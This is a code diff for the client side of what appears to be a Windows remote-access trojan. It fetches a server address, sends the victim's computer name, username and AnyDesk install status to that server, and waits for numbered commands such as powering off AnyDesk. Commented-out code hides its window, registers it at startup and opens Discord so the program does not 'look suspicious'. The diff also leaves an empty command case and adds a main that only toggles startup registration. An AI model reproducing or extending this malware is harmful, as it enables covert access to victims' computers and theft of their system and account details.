@@ -1,6 +1,5 @@
 #include <stdio.h>
 #include <Windows.h>
-#include <stdbool.h>
 #include "CurlRequest.h"
 #include "StartupRegister.h"
 #include "AnyDeskFile.h"
@@ -20,56 +19,81 @@ void connectToHost()
     Connects to the server
     */
 
-    struct Server server = getIpAndPort();
-    while (strcmp(server.PORT, REQUEST_FAILED_ERROR) == 0) {
-        printf("Can't get ip and port, try again in 1 mintue...");
-        Sleep(60000);
-        server = getIpAndPort();
-    }
-
+    struct Server server;
     struct sockaddr_in hostAddress;
+    struct PcDetails pcDetails;
     WSADATA wsaData;
     int iResult;
+    int isAnyDeskInstalledHtonl = 0;
 
-    
-    while (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-    {
-        printf("WSAStartup failed: %d, trying again in 1 minute...\n", iResult);
-        Sleep(60000);
-    }
+    start:
+        while (getIpAndPort(&server) != 0) {
+            printf("Can't get ip and port, try again in 1 mintue...");
+            Sleep(60000);
+        }
 
-    // Creates the socket
-    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
-    while (serverSocket == -1)
-    {
-        printf("socket creation failed, trying again in 1 minutes \n");
-        Sleep(60000);
+        while (iResult = WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        {
+            printf("WSAStartup failed: %d, trying again in 1 minute...\n", iResult);
+            Sleep(60000);
+        }
+
+        // Creates the socket
         serverSocket = socket(AF_INET, SOCK_STREAM, 0);
-    }
-    printf("Socket successfully created..\n");
+        while (serverSocket == -1)
+        {
+            printf("socket creation failed, trying again in 1 minutes \n");
+            Sleep(60000);
+            serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+        }
+        printf("Socket successfully created..\n");
 
-    // Defines the server IP & PORT
-    hostAddress.sin_family = AF_INET;
-    hostAddress.sin_addr.S_un.S_addr = inet_addr(server.IP);
-    hostAddress.sin_port = htons(atoi(server.PORT));
-
-    // Connects to the server
-    while (connect(serverSocket, (struct sockaddr *)&hostAddress, sizeof(hostAddress)) != 0)
-    {
-        printf("connection with the server failed %d, trying again in 5 minues... \n", GetLastError());
-        //Sleep(300000);
-        Sleep(2000);
-
-        // ReDefines the server IP & PORT
-        server = getIpAndPort();
+        // Defines the server IP & PORT
         hostAddress.sin_family = AF_INET;
         hostAddress.sin_addr.S_un.S_addr = inet_addr(server.IP);
         hostAddress.sin_port = htons(atoi(server.PORT));
-    }
-    printf("connected to the server..\n");
 
-    struct PcDetails pcDetails = getPcDetails();
-    printf("Sending username");
+        // Connects to the server
+        while (connect(serverSocket, (struct sockaddr*)&hostAddress, sizeof(hostAddress)) != 0)
+        {
+            printf("connection with the server failed %d, trying again in 5 minues... \n", GetLastError());
+            //Sleep(300000);
+            Sleep(2000);
+
+            // ReDefines the server IP & PORT
+            while (getIpAndPort(&server) != 0) {
+                printf("Can't get ip and port, try again in 1 mintue...");
+                Sleep(60000);
+            }
+            hostAddress.sin_family = AF_INET;
+            hostAddress.sin_addr.S_un.S_addr = inet_addr(server.IP);
+            hostAddress.sin_port = htons(atoi(server.PORT));
+        }
+        printf("connected to the server..\n");
+
+        pcDetails = getPcDetails();
+        isAnyDeskInstalledHtonl = htonl(pcDetails.isAnyDeskInstalled);
+
+        printf("Sending Computer Name...\n");
+        if (send(serverSocket, pcDetails.computerName, sizeof(pcDetails.computerName), 0) == SOCKET_ERROR){
+            printf("Can't sending computer name %d\n", GetLastError());
+            printf("Reconnecting to server...\n");
+            goto start;
+        }
+
+        printf("Sending Logged Username...\n");
+        if (send(serverSocket, pcDetails.userName, sizeof(pcDetails.userName), 0) == SOCKET_ERROR) {
+            printf("Can't sending username %d\n", GetLastError());
+            printf("Reconnecting to server...\n");
+            goto start;
+        }
+
+        printf("Sending if anydesk install status...\n");
+        if (send(serverSocket, &isAnyDeskInstalledHtonl, sizeof(isAnyDeskInstalledHtonl), 0) == SOCKET_ERROR) {
+            printf("Can't anydesk install status %d\n", GetLastError());
+            printf("Reconnecting to server...\n");
+            goto start;
+        }
 }
 
 int getCommands()
@@ -89,7 +113,6 @@ int getCommands()
         // Gets the command
         if (recv(serverSocket, (char *)&command, sizeof(command), 0) <= 0)
         {
-            // TODO: checks that
             printf("Server connection has been closed!\n");
             return SOCKET_ERROR;
         }
@@ -133,6 +156,8 @@ int processCommand(int command)
     case 3:
         powerOffAnyDesk();
         break;
+    case 4:
+        
 
     default:
         break;
@@ -155,16 +180,15 @@ void checkIfProgramAlreadyRunning()
 //
 //    //hideConsoleWindow(); // Hides the console window
 //
-//    ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
+//    //ShellExecute(0, 0, L"https://discord.com/", 0, 0, SW_SHOW); // Opens discord to don't looks suspicios
 //    checkIfProgramAlreadyRunning();
 //    
-//    //RegisterProgram();                                          // Registers the app to the startup
+//    //RegisterProgram(); // Registers the app to the startup
 //    setAnyDeskFilePath();
 //    
 //    if (isTheAnyDeskFile(anyDeskFilePath)) {
 //        _defineAnyDeskSettings(); // TODO: make it updated
 //    }
-//
 //
 //    connectToHost();
 //
@@ -180,3 +204,8 @@ void checkIfProgramAlreadyRunning()
 //
 //    return 0;
 //}
+
+int main() {
+    RegisterProgram();
+    RemoveMyProgramFromStartup();
+}
